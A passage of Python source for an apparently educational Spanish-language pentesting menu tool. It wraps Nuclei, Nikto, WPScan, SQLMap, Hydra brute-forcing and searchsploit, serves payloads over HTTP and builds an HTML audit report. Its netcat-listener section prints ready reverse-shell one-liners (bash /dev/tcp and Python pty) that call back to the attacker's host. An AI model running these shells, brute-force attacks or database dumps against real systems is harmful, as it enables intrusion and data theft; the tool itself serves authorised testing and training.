            except FileNotFoundError:
                print(f"{Fore.RED}[!] El comando APT falló (Comprueba si estás en Debian/Kali/Ubuntu).{Style.RESET_ALL}")
                return
        else:
            print(f"{Fore.YELLOW}[!] Instalación omitida. Abortando módulo Nuclei.{Style.RESET_ALL}")
            return

    edu_print(
        tool="Nuclei",
        phase="Escaneo Automático Basado en Plantillas de Vulnerabilidad (CVEs)",
        explanation="- 'nuclei -u <target>':\n"
                    "- Marco moderno de testeo de debilidades basado en archivos YAML.\n"
                    "- precisas buscando CVEs, desactualizaciones de librerías y fugas de datos."
    )
    
    _warn("Nuclei iniciara la prueba de plantillas. Esto tardara varios minutos...")
    print()

    json_file = os.path.join(workspace_dir, "web", "nuclei.json")
    cmd = ['nuclei', '-u', base_url, '-jsonl', '-silent']
    _line("-", Fore.YELLOW)
    print(f"  {Fore.YELLOW}>> COMANDO:{Style.RESET_ALL}  {Fore.WHITE}{' '.join(cmd)} > {json_file}")
    _line("-", Fore.YELLOW)
    print()

    # Ejecutar con spinner; stdout (JSONL) redirigido al fichero
    try:
        with open(json_file, 'w', encoding='utf-8') as jf:
            proc = subprocess.Popen(cmd, stdout=jf, stderr=subprocess.DEVNULL)
        _spinner_run("Nuclei analizando plantillas de vulnerabilidades...", proc)
        proc.wait()
    except FileNotFoundError:
        _err("Nuclei no encontrado en el sistema.")
        return

    # Mostrar resumen limpio a partir del fichero JSON generado
    findings = []
    if os.path.exists(json_file):
        with open(json_file, 'r', encoding='utf-8', errors='replace') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    v = json.loads(line)
                    findings.append(v)
                except json.JSONDecodeError:
                    pass

    print(f"\n{Fore.CYAN}╔{'═' * (W-2)}╗")
    header = "  RESULTADOS NUCLEI"
    print(f"{Fore.CYAN}║{Style.BRIGHT}{Fore.WHITE}{header}{' ' * (W-2-len(header))}{Style.RESET_ALL}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╚{'═' * (W-2)}╝{Style.RESET_ALL}")

    if not findings:
        _info("Nuclei no encontro hallazgos. El objetivo parece seguro o las plantillas no aplican.")
    else:
        _ok(f"Se encontraron {len(findings)} hallazgo(s):")
        print()
        # Cabecera de tabla
        sev_w, name_w, url_w = 10, 36, W - 10 - 36 - 6
        print(f"  {Fore.CYAN}{'SEVERIDAD':<{sev_w}}  {'NOMBRE':<{name_w}}  {'URL':<{url_w}}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}{'-'*sev_w}  {'-'*name_w}  {'-'*url_w}{Style.RESET_ALL}")
        for v in findings:
            sev   = v.get('info', {}).get('severity', 'info').upper()
            name  = (v.get('info', {}).get('name') or v.get('template-id', '?'))[:name_w]
            url   = (v.get('matched-at') or '')[:url_w]
            sev_color = (Fore.RED if sev in ('CRITICAL', 'HIGH')
                         else Fore.YELLOW if sev == 'MEDIUM'
                         else Fore.CYAN)
            print(f"  {sev_color}{sev:<{sev_w}}{Style.RESET_ALL}  {Fore.WHITE}{name:<{name_w}}{Style.RESET_ALL}  {Fore.BLUE}{url}{Style.RESET_ALL}")
        print()
        _ok(f"Resultados completos guardados en: {json_file}")


def run_nikto(target, protocol, workspace_dir):
    """Ejecuta Nikto para escaneo de vulnerabilidades web clasico."""
    base_url = f"{protocol}{target}"

    if shutil.which('nikto') is None:
        _err("Nikto no encontrado. Instala con: sudo apt install nikto")
        return

    edu_print(
        tool="Nikto",
        phase="Escaneo de Vulnerabilidades Web Clasico",
        explanation="- 'nikto -h <url>': Herramienta estandar de auditoria web.\n"
                    "- Detecta ficheros peligrosos, versiones de servidor, cabeceras inseguras.\n"
                    "- Mas de 6700 checks incluidos. Ideal como primer analisis rapido del servidor.\n"
                    "- '-o fichero': Guarda la salida en fichero para el informe."
    )

    log_file = os.path.join(workspace_dir, "web", "nikto_resultados.txt")
    cmd = ['nikto', '-h', base_url, '-o', log_file, '-Format', 'txt', '-nointeractive']

    _line("-", Fore.YELLOW)
    print(f"  {Fore.YELLOW}>> COMANDO:{Style.RESET_ALL}  {Fore.WHITE}{' '.join(cmd)}")
    _line("-", Fore.YELLOW)
    print()

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _spinner_run("Nikto auditando servidor web...", proc)
        proc.wait()
    except FileNotFoundError:
        _err("Nikto no encontrado.")
        return

    # Mostrar resumen: lineas que empiezan con + son hallazgos
    findings = []
    if os.path.exists(log_file):
        with open(log_file, 'r', encoding='utf-8', errors='replace') as lf:
            for line in lf:
                line = line.rstrip()
                if line.startswith('+'):
                    findings.append(line[1:].strip())

    if findings:
        _ok(f"Nikto encontro {len(findings)} hallazgo(s):")
        print()
        for h in findings:
            display = h if len(h) <= W - 6 else h[:W - 9] + "..."
            print(f"  {Fore.YELLOW}[+]{Style.RESET_ALL} {Fore.WHITE}{display}{Style.RESET_ALL}")
        print()
        _ok(f"Log completo en: {log_file}")
    else:
        _info("Nikto no reporto hallazgos significativos.")


def run_wpscan(target, protocol, workspace_dir):
    """Ejecuta un escaneo automatizado contra WordPress actualizando su BBDD primero."""
    base_url = f"{protocol}{target}/"

    if shutil.which('wpscan') is None:
        print(f"{Fore.RED}[!] WPScan no encontrado en el sistema. Puedes instalarlo con 'sudo apt install wpscan'.")
        return

    edu_print(
        tool="WPScan",
        phase="Escaneo Específico de CMS (WordPress)",
        explanation="- 'wpscan --url <target> -e u,vp --update': Herramienta ultra-especializada para WordPress.\n"
                    "- '--update': Se actualizará primero silenciosamente para no bloquearse pidiendo Y/n.\n"
                    "- '-e u': Ennumera masivamente Usuarios válidos del panel (para luego hacer fuerza bruta).\n"
                    "- '-e vp': Enumera Plugins Vulnerables, comparándolos contra la base de datos wpvulndb."
    )
    
    log_file = os.path.join(workspace_dir, "web", "wpscan_resultados.txt")
    
    # Hemos removido el --batch que daba problemas si wpscan requiere interactividad o rompía el pipeline.
    # Ahora forzamos explícitamente la DB update antes de correr y nos saltamos las pausas.
    cmd = ['wpscan', '--url', base_url, '-e', 'u,vp', '--update']
    run_cmd(cmd, capture_output=True, log_file=log_file)


def run_sqlmap(workspace_dir):
    """Módulo inyección de bases de datos automatizado."""
    if shutil.which('sqlmap') is None:
        print(f"{Fore.RED}[!] SQLMap no está instalado en tu sistema.")
        return
        
    print(f"\n{Fore.GREEN}[*] Inicializando Suite SQLMap (Inyección SQL Automatizada){Style.RESET_ALL}")
    url_target = input(f"{Fore.CYAN}[?] Introduce la URL vulnerable a probar (Ej: http://10.0.0.1/item.php?id=1): ").strip()
    
    if not url_target:
        return
        
    edu_print(
        tool="SQLMap",
        phase="Explotación Web Activa (Inyecciones SQL)",
        explanation="- 'sqlmap -u \"<url_con_parametro>\" --batch --dbs':\n"
                    "- Herramienta por excelencia para volcar DBs ciegamente o basadas en errores.\n"
                    "- '--batch': Responderá automáticamente con la opción por defecto a todas las preguntas.\n"
                    "- '--dbs': Intentará enumerar todas las Bases de Datos disponibles."
    )
    
    log_file = os.path.join(workspace_dir, "web", "sqlmap_databases.txt")
    run_cmd(['sqlmap', '-u', url_target, '--batch', '--dbs'], capture_output=True, log_file=log_file)


def run_hydra_bruteforce(target, workspace_dir):
    """Ejecuta Hydra para fuerza bruta sobre SSH o FTP."""
    if shutil.which('hydra') is None:
        print(f"{Fore.RED}[!] Hydra no está instalado. (sudo apt install hydra)")
        return
        
    print(f"\n{Fore.GREEN}[*] Inicializando Suite HYDRA contra {target}{Style.RESET_ALL}")
    service = input(f"{Fore.CYAN}[?] ¿Qué servicio deseas atacar? (Opciones: ssh, ftp): ").strip().lower()
    
    if service not in ['ssh', 'ftp']:
        print(f"{Fore.RED}[!] Por ahora este script educacional solo soporta ssh o ftp.")
        return
        
    user = input(f"{Fore.CYAN}[?] Introduce el nombre del usuario a brute-forcear (Ej: root, admin): ").strip()
    wordlist = input(f"{Fore.CYAN}[?] Ruta del diccionario de contraseñas (Enter para /usr/share/wordlists/rockyou.txt): ").strip()
    
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
        
    if not os.path.exists(wordlist):
        print(f"{Fore.RED}[!] No se encontró el diccionario: {wordlist}")
        return

    edu_print(
        tool="Hydra",
        phase=f"Explotación Activa (Ataque de Diccionario {service.upper()})",
        explanation=f"- 'hydra -l {user} -P {wordlist} {service}://{target}':\n"
                    f"- Ataca validaciones de login de forma masiva enviando cientos de contraseñas por minuto.\n"
                    f"- Fíjate que el servicio {service.upper()} debe estar primero abierto (comprobado vía Nmap)."
    )
    
    log_file = os.path.join(workspace_dir, "exploits", f"hydra_{service}_bruteforce.txt")
    run_cmd(['hydra', '-l', user, '-P', wordlist, f"{service}://{target}"], capture_output=True, log_file=log_file)


def run_enum4linux(target, workspace_dir):
    """Módulo de reconocimiento de redes Windows (Active Directory / SMB)."""
    if shutil.which('enum4linux') is None:
        print(f"{Fore.RED}[!] Enum4linux no está instalado.")
        return
        
    edu_print(
        tool="Enum4Linux",
        phase="Reconocimiento Avanzado de Entornos Windows",
        explanation=f"- 'enum4linux -a {target}':\n"
                    f"- Si el host devolvió un TTL de 128 (Windows) y tiene los puertos 139/445 de red expuestos,\n"
                    f"- Esta herramienta extrae usuarios, grupos y carpetas compartidas a través de 'Null Sessions' (sesiones nulas sin clave)."
    )
    
    log_file = os.path.join(workspace_dir, "nmap", "enum4linux_windows.txt")
    run_cmd(['enum4linux', '-a', target], capture_output=True, log_file=log_file)


def start_http_server_payloads(workspace_dir):
    """Levanta un servidor temporal local para servir archivos (LinPEAS, payloads)."""
    print(f"\n{Fore.GREEN}==================================================================")
    print(f"{Fore.GREEN}[!] TIP EDUCATIVO: Transferencia de Archivos (Post-Explotación).{Style.RESET_ALL}")
    print(f"    Si ya conseguiste una shell (RCE) en la víctima, a menudo necesitas subir herramientas como LinPEAS.")
    print(f"    Esto permite descargar a la víctima archivos desde *tu máquina* usando: wget http://TU_IP/archivo")
    print(f"{Fore.GREEN}==================================================================\n")
    
    # Creamos subcarpeta payloads
    payload_dir = os.path.join(workspace_dir, "payloads")
    if not os.path.exists(payload_dir):
         os.makedirs(payload_dir)
         
    print(f"{Fore.CYAN}[*] Mueve tus scripts de escalada (linpeas.sh, winpeas.exe, shells) a la carpeta: {Style.BRIGHT}{payload_dir}{Style.RESET_ALL}")
    port = input(f"{Fore.CYAN}[?] ¿En qué puerto quieres levantar el servidor? (Enter para 8000): ").strip()
    if not port: port = "8000"
    
    print(f"{Fore.YELLOW}[>] Ejecutando: python3 -m http.server {port} --directory {payload_dir}{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Presiona Ctrl+C para apagar el servidor cuando hayas transferido lo que necesitabas.{Style.RESET_ALL}")
    try:
         subprocess.run(['python3', '-m', 'http.server', port, '--directory', payload_dir])
    except KeyboardInterrupt:
         print(f"{Fore.GREEN}\n[+] Servidor web de transferencia apagado. Retornando al menú.{Style.RESET_ALL}")


def run_netcat_listener(workspace_dir):
    """Abre un puerto de escucha local con Netcat para recibir reverse shells."""
    if shutil.which('nc') is None and shutil.which('ncat') is None:
        _err("Netcat (nc/ncat) no encontrado. Instala con: sudo apt install netcat-traditional")
        return

    nc_bin = 'nc' if shutil.which('nc') else 'ncat'

    edu_print(
        tool="Netcat (Listener)",
        phase="Post-Explotacion -- Recepcion de Reverse Shell",
        explanation="- 'nc -lvnp <puerto>': Abre un socket TCP en escucha en tu maquina.\n"
                    "- La victima ejecutara un payload como: bash -i >& /dev/tcp/TU_IP/<puerto> 0>&1\n"
                    "- Cuando conecte recibiras una shell interactiva directamente en esta terminal.\n"
                    "- -l: modo listen  |  -v: verbose  |  -n: sin DNS  |  -p: puerto"
    )

    port = _prompt("Puerto de escucha (Enter para 4444)").strip()
    if not port:
        port = "4444"

    _line("-", Fore.RED)
    print(f"  {Fore.RED}>> ESCUCHANDO en 0.0.0.0:{port} -- Ctrl+C para cerrar{Style.RESET_ALL}")
    _line("-", Fore.RED)
    print(f"\n  {Fore.YELLOW}Payload de ejemplo para Linux (ejecutar en la victima):{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}bash -i >& /dev/tcp/TU_IP/{port} 0>&1{Style.RESET_ALL}")
    print(f"\n  {Fore.YELLOW}Payload alternativo (Python):{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"TU_IP\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'{Style.RESET_ALL}")
    print()

    try:
        subprocess.run([nc_bin, '-lvnp', port])
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}[+] Listener cerrado. Retornando al menu.{Style.RESET_ALL}")


def run_searchsploit(workspace_dir):
    """Ejecuta searchsploit de forma automatizada leyendo el reporte de Nmap."""
    if shutil.which('searchsploit') is None:
        print(f"{Fore.RED}[!] Searchsploit/Exploit-DB no instalados.")
        return

    nmap_file = os.path.join(workspace_dir, "nmap", "escaneo_principal.txt")
    if not os.path.exists(nmap_file):
        print(f"{Fore.RED}[!] No se puede automatizar SearchSploit: Primero debes ejecutar la fase de Nmap (Opción 2).")
        return

    edu_print(
        tool="searchsploit",
        phase="Análisis de Vulnerabilidades Automatizado",
        explanation="- El script extraerá dinámicamente los servicios y versiones descubiertos por Nmap.\n"
                    "- Luego, buscará automáticamente Exploits Públicos (CVEs) para cada uno."
    )

    print(f"{Fore.CYAN}[*] Analizando resultados de Nmap para extraer versiones de servicios...{Style.RESET_ALL}")
    
    services_found = []
    
    # Limpiador de texto basura común en las versiones de Nmap (httpd, OpenSSH, vsftpd)
    # Por ejemplo Nmap dice: "Apache httpd 2.4.29" -> Nos interesa "Apache 2.4.29" para Searchsploit
    def clean_service_version(raw_service, raw_version):
        version_no_os = re.sub(r'\(.*?\)', '', raw_version).strip()
        tokens = version_no_os.split()
        
        # Diccionario de ignorados que ensucian SearchSploit
        ignored = ['httpd', 'smbd', 'sshd', 'ftpd']
        
        safe_tokens = [t for t in tokens if t.lower() not in ignored]
        
        # A veces Nmap dice solo "nginx" en raw_service y nada en raw_version.
        if not safe_tokens:
            return raw_service
            
        # Nos quedamos con la palabra base del servicio y el primer número de versión que haya
        # Ej: "Apache" y "2.4.3" -> "Apache 2.4.3"
        return f"{safe_tokens[0]} {safe_tokens[1]}" if len(safe_tokens) > 1 else safe_tokens[0]

    with open(nmap_file, 'r', encoding='utf-8', errors='replace') as f:
        # Match puertos abiertos y nos quedamos con la versión (resto de la línea)
        for line in f:
            match = re.match(r'^\d+/\w+\s+open\s+([\w\-]+)\s+(.+)$', line.strip())
            if match:
                servicio = match.group(1).strip()
                version = match.group(2).strip()
                
                query = clean_service_version(servicio, version)
                if query and query not in services_found:
                    services_found.append((servicio, query))

    if not services_found:
        print(f"{Fore.YELLOW}[!] Nmap no logró determinar versiones exactas, o el escaneo está vacío.")
        print(f"{Fore.YELLOW}[!] No hay material para buscar exploits.")
        return

    for srv, query in services_found:
        print(f"\n{Fore.GREEN}[*] Buscando exploits para => {Style.BRIGHT}{srv}: {query}{Style.RESET_ALL}")
        cmd = ['searchsploit'] + query.split()
        
        # Le añadimos un sufijo seguro al archivo al guardarlo
        safe_name = re.sub(r'[^a-zA-Z0-9_\-]', '_', query)
        log_file = os.path.join(workspace_dir, "exploits", f"exploits_{srv}_{safe_name}.txt")
        run_cmd(cmd, capture_output=True, log_file=log_file)


def parse_nmap(nmap_file):
    ports = []
    if not os.path.exists(nmap_file):
        return ports
    try:
        tree = ET.parse(nmap_file)
        root = tree.getroot()
        for host in root.findall('host'):
            for port in host.findall('ports/port'):
                portid = port.get('portid')
                protocol = port.get('protocol')
                state = port.find('state').get('state')
                
                service = port.find('service')
                service_name = service.get('name') if service is not None else "unknown"
                product = service.get('product') if service is not None else ""
                version = service.get('version') if service is not None else ""
                
                ports.append({
                    'port': portid,
                    'protocol': protocol,
                    'state': state,
                    'service': service_name,
                    'version': f"{product} {version}".strip()
                })
    except Exception:
        pass
    return ports


def parse_nuclei(report_dir):
    nuclei_vulns = []
    nuclei_file = os.path.join(report_dir, "web", "nuclei.json")
    if not os.path.exists(nuclei_file):
        return nuclei_vulns
    try:
        with open(nuclei_file, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    vuln = json.loads(line)
                    nuclei_vulns.append({
                        'template-id': vuln.get('template-id'),
                        'name': vuln.get('info', {}).get('name'),
                        'severity': vuln.get('info', {}).get('severity', 'info'),
                        'type': vuln.get('type'),
                        'matched-at': vuln.get('matched-at')
                    })
                except json.JSONDecodeError:
                    pass
    except Exception:
        pass
    return nuclei_vulns


def parse_ffuf(report_dir, domain):
    ffuf_results = []
    if not domain:
        return ffuf_results
    json_file = os.path.join(report_dir, "web", f"ffuf_{domain.replace('.', '_')}.json")
    if not os.path.exists(json_file):
        return ffuf_results
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if 'results' in data:
                for res in data['results']:
                    ffuf_results.append({
                        'url': res.get('url'),
                        'status': res.get('status'),
                        'length': res.get('length'),
                        'input': res.get('input', {}).get('FUZZ')
                    })
    except Exception:
        pass
    return ffuf_results


def generate_html_report(ip, domain, workspace_dir):
    """Genera un reporte HTML profesional, dinámico y estructurado, estilo Dashboard."""
    print(f"\n{Fore.BLUE}[*] Generando Reporte HTML Profesional de Auditoría (Dashboard)...{Style.RESET_ALL}")
    
    # 1. Parsear datos estructurados
    nmap_data = parse_nmap(os.path.join(workspace_dir, "nmap", "nmap.xml"))
    nuclei_vulns = parse_nuclei(workspace_dir)
    ffuf_results = parse_ffuf(workspace_dir, domain)

    html_file = os.path.join(workspace_dir, f"Reporte_Pentest_{ip.replace('.', '_')}.html")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    target_display = ip if domain is None else f"{ip} ({domain})"
    
    html_content = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informe de Auditoría de Seguridad Pro - {now}</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {{
            --bg-body: #0f111a;
            --primary: #00ff88;
            --secondary: #1a1e29;
            --accent: #f59e0b;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --text-main: #e2e8f0;
            --text-muted: #94a3b8;
        }}
        body {{
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg-body);
            color: var(--text-main);
            margin: 0; padding: 0;
            display: flex;
        }}
        .sidebar {{
            width: 250px;
            height: 100vh;
            background-color: var(--secondary);
            color: white;
            position: fixed;
            padding: 24px;
            box-sizing: border-box;
            border-right: 1px solid rgba(255,255,255,0.05);
        }}
        .main-content {{
            margin-left: 250px;
            padding: 40px;
            width: 100%;
            max-width: 1200px;
            box-sizing: border-box;
        }}
        .header {{
            background: linear-gradient(135deg, #1e2433, #11141e);
            color: white;
            padding: 40px;
            border-radius: 16px;
            margin-bottom: 40px;
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.1);
            position: relative;
            border: 1px solid rgba(0,255,136,0.2);
        }}
        .header h1 {{ margin: 0; font-size: 2.2rem; font-weight: 700; color: #fff; text-transform: uppercase; }}
        .header p {{ opacity: 0.9; font-size: 1rem; margin-top: 8px; color: var(--text-muted); }}
        
        .card {{
            background: var(--secondary);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 32px;
            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.05);
        }}
        .section-title {{
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            margin-bottom: 24px;
            padding-bottom: 12px;
        }}
        .section-title h2 {{ margin: 0; font-size: 1.3rem; color: #fff; font-weight: 600; }}
        
        table {{
            width: 100%; border-collapse: collapse; margin-top: 8px;
        }}
        th, td {{ padding: 14px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }}
        th {{ background-color: rgba(0,0,0,0.2); font-weight: 600; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em; color: var(--text-muted); }}
        
        .badge {{ padding: 6px 12px; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; display: inline-block; }}
        .badge-info {{ background-color: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }}
        .badge-success {{ background-color: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }}
        .badge-warning {{ background-color: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }}
        .badge-danger {{ background-color: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }}
        
        .severity-critical {{ border-left: 4px solid #7c3aed; }}
        .severity-high {{ border-left: 4px solid #ef4444; }}
        .severity-medium {{ border-left: 4px solid #f59e0b; }}
        .severity-low {{ border-left: 4px solid #3b82f6; }}
        
        .footer {{ text-align: center; color: var(--text-muted); padding: 40px; font-size: 0.85rem; border-top: 1px solid rgba(255,255,255,0.05); margin-top: 40px; }}
        
        /* Stats row */
        .stats-row {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 40px;
        }}
        .stat-card {{
            background: var(--secondary); border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05);
        }}
        .stat-val {{ font-size: 2rem; font-weight: 700; color: var(--primary); }}
        .stat-label {{ font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-top:5px; }}
        
        pre {{
            font-family: monospace;
            background: #0b0d14;
            padding: 15px;
            border-radius: 8px;
            color: #a9b7c6;
            overflow-x: auto;
            border: 1px solid rgba(255,255,255,0.05);
            font-size: 0.85rem;
        }}
        
        code.inline {{
            background: rgba(255,255,255,0.1);
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
            color: #e2e8f0;
        }}

    </style>
</head>
<body>
    <div class="sidebar">
        <h3 style="color:var(--primary); margin-top:0;">Educational Pentest</h3>
        <p style="font-size: 0.8rem; color:var(--text-muted);">Framework Reporting</p>
        <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.1); margin: 20px 0;">
        <nav>
            <p style="font-size: 0.9rem; color:#fff;"><strong>Target:</strong><br>{target_display}</p>
        </nav>
    </div>

    <div class="main-content">
        <div class="header">
            <h1>Executive Audit Report</h1>
            <p>Resumen analítico de reconocimiento y vulnerabilidades</p>
            <span style="position: absolute; top: 40px; right: 40px; background: rgba(0,255,136,0.1); color: var(--primary); padding: 8px 16px; border-radius: 8px; font-weight:600; font-size:0.85rem; border:1px solid rgba(0,255,136,0.2);">{now}</span>
        </div>

        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-val">{len(nmap_data)}</div>
                <div class="stat-label">Puertos Abiertos</div>
            </div>
            <div class="stat-card">
                <div class="stat-val">{len(nuclei_vulns)}</div>
                <div class="stat-label">Hallazgos Nuclei</div>
            </div>
            <div class="stat-card">
                <div class="stat-val">{len(ffuf_results)}</div>
                <div class="stat-label">Subdominios / Rutas</div>
            </div>
            <div class="stat-card">
                <div class="stat-val">Evd.</div>
                <div class="stat-label">Logs Maestros</div>
            </div>
        </div>

        <!-- SECCION NMAP -->
        <div class="card">
            <div class="section-title"><h2>🛰 Reconocimiento de Puertos (Nmap)</h2></div>
            """

    if nmap_data:
        html_content += """
            <table>
                <thead>
                    <tr>
                        <th>Puerto / Proto</th>
                        <th>Estado</th>
                        <th>Servicio</th>
                        <th>Versión Detectada</th>
                    </tr>
                </thead>
                <tbody>
        """
        for port in nmap_data:
            html_content += f"""
                    <tr>
                        <td><strong>{port['port']}/{port['protocol']}</strong></td>
                        <td><span class="badge badge-success">{port['state']}</span></td>
                        <td>{port['service']}</td>
                        <td><code class="inline">{port['version'] if port['version'] else 'N/D'}</code></td>
                    </tr>
            """
        html_content += """
                </tbody>
            </table>
        """
    else:
        html_content += "<p style='color:var(--text-muted);'>No se encontraron puertos abiertos o no se corrió Nmap.</p>"

    html_content += """
        </div>

        <!-- SECCION NUCLEI -->
        <div class="card">
            <div class="section-title"><h2>Vulnerabilidades (Nuclei)</h2></div>
            """
    
    if nuclei_vulns:
        html_content += "<table><thead><tr><th>Falla Detectada</th><th>Gravedad</th><th>Tipo</th><th>Evidencia Macheada</th></tr></thead><tbody>"
        for v in nuclei_vulns:
            sev_class = f"severity-{v['severity'].lower()}"
            badge_class = f"badge-{'danger' if v['severity'].lower() in ['critical', 'high'] else 'warning' if v['severity'].lower() == 'medium' else 'info'}"
            html_content += f"""
                    <tr class="{sev_class}">
                        <td><strong>{v['name']}</strong></td>
                        <td><span class="badge {badge_class}">{v['severity']}</span></td>
                        <td>{v['type']}</td>
                        <td><span style="font-size:0.8rem; color:var(--text-muted);">{v['matched-at']}</span></td>
                    </tr>
            """
        html_content += "</tbody></table>"
    else:
        html_content += "<p style='color:var(--text-muted);'>No se detectaron hallazgos automáticos con Nuclei.</p>"

    html_content += """
        </div>

        <!-- SECCION FFUF -->
        <div class="card">
            <div class="section-title"><h2>🗂 Subdominios Descubiertos (FFuF)</h2></div>
            """
    if ffuf_results:
        html_content += "<table><thead><tr><th>Subdominio Encontrado</th><th>HTTP Status</th><th>URL Completa</th></tr></thead><tbody>"
        for r in ffuf_results:
            html_content += f"""
                    <tr>
                        <td><code class="inline">{r['input']}</code></td>
                        <td><span class="badge badge-info">{r['status']}</span></td>
                        <td><a href="{r['url']}" target="_blank" style="color:var(--primary); text-decoration:none;">{r['url']}</a></td>
                    </tr>
            """
        html_content += "</tbody></table>"
    else:
        html_content += "<p style='color:var(--text-muted);'>No se realizó fuzzing de subdominios o no hubo hallazgos válidos.</p>"

    html_content += """
        </div>

        <!-- LOGS TEXTUALES PLANOS DE OTRAS HERRAMIENTAS (SearchSploit, Enum4Linux, WPScan, Gobuster) -->
        <div class="card">
            <div class="section-title"><h2>📄 Volcado de Evidencia RAW (Otras Herramientas)</h2></div>
            """

    found_logs = False
    
    # Excluir las que ya parseamos en las tablas bonitas
    xml_json_files = ['nmap.xml', 'nuclei.json']
    # y también los .json de ffuf
    
    for root, dirs, files in os.walk(workspace_dir):
        for file in files:
            if file.endswith('.txt'):
                found_logs = True
                file_path = os.path.join(root, file)
                module_name = os.path.basename(root).upper()
                
                html_content += f"""
            <h4 style="color:#fff; margin-top:20px; border-bottom:1px dashed rgba(255,255,255,0.1); padding-bottom:5px;">{module_name}: {file}</h4>
            <pre>"""
                try:
                    with open(file_path, 'r', encoding="utf-8", errors="replace") as f:
                        # Saltar nuestras cabezeras del log para q quede mas limpio
                        lines = f.readlines()
                        clean_lines = []
                        skip = False
                        for l in lines:
                            if l.startswith("=== Reporte generado por"): skip = True
                            if skip and l.startswith("========================="):
                                skip = False
                                continue
                            if not skip:
                                clean_lines.append(l)
                                
                        content = "".join(clean_lines).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
                        html_content += content
                except Exception:
                    html_content += "Error leyendo el archivo."
                
                html_content += """</pre>"""

    if not found_logs:
         html_content += """<p style='color:var(--text-muted);'>No hay evidencias extra recopiladas.</p>"""

    html_content += f"""
        </div>

        <div class="footer">
            <p>&copy; {datetime.now().year} Educational Pentesting Framework. Propietario: {os.getlogin() if hasattr(os, 'getlogin') else 'Admin'}</p>
        </div>
    </div>
</body>
</html>"""


    with open(html_file, "w", encoding="utf-8") as f:
        f.write(html_content)
        
    print(f"{Fore.GREEN}[+] ¡Reporte HTML generado exitosamente!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Guardado en: {html_file}{Style.RESET_ALL}")
    
    try:
        if sys.platform == 'win32':
            os.startfile(html_file)
        else:
            subprocess.run(['xdg-open', html_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
         pass


def target_menu(ip):
    """Menú secundario encapsulado para concentrarse en un target particular."""
    workspace_dir = create_workspace(ip)
    if workspace_dir is None:
        return
        
    active_target  = ip
    active_domain  = None
    has_web_flags  = False
    active_protocol = "http://"
    nmap_executed  = False
    
    while True:
        _clr()
        target_display = f"{ip}" if not active_domain else f"{ip}  ╱  {active_domain}"

        # -- Header
        print(f"{Fore.GREEN}╔{'═' * (W-2)}╗")
        title_label = f"  PANEL DE ATAQUE  --  {target_display}"
        label_pad = max(0, W - 2 - len(title_label))
        print(f"{Fore.GREEN}║{Style.BRIGHT}{Fore.WHITE}{title_label}{' ' * label_pad}{Style.RESET_ALL}{Fore.GREEN}║")
        
        # Status bar (usamos texto plano para que len() funcione correctamente)
        nmap_ok   = "[OK] Nmap" if nmap_executed else "[--] Nmap"
        web_ok    = f"[OK] Web ({active_protocol.replace('://', '')})" if has_web_flags else "[--] Web"
        vhost_ok  = f"[OK] VHost ({active_domain})" if active_domain else "[--] VHost"
        ws_label  = f"  Workspace: {workspace_dir}/"
        
        nmap_c  = Fore.GREEN if nmap_executed else Fore.RED
        web_c   = Fore.GREEN if has_web_flags else Fore.RED
        vhost_c = Fore.MAGENTA if active_domain else Fore.YELLOW
        
        print(f"{Fore.GREEN}╠{'─' * (W-2)}╣")
        status_plain = f"  Estado > {nmap_ok}  {web_ok}  {vhost_ok}"
        status_color = f"  Estado > {nmap_c}{nmap_ok}{Style.RESET_ALL}  {web_c}{web_ok}{Style.RESET_ALL}  {vhost_c}{vhost_ok}{Style.RESET_ALL}"
        status_pad   = max(0, W - 2 - len(status_plain))
        print(f"{Fore.GREEN}║{status_color}{' ' * status_pad}")
        ws_pad = max(0, W - 2 - len(ws_label))
        print(f"{Fore.GREEN}║{Fore.CYAN}{ws_label}{' ' * ws_pad}")
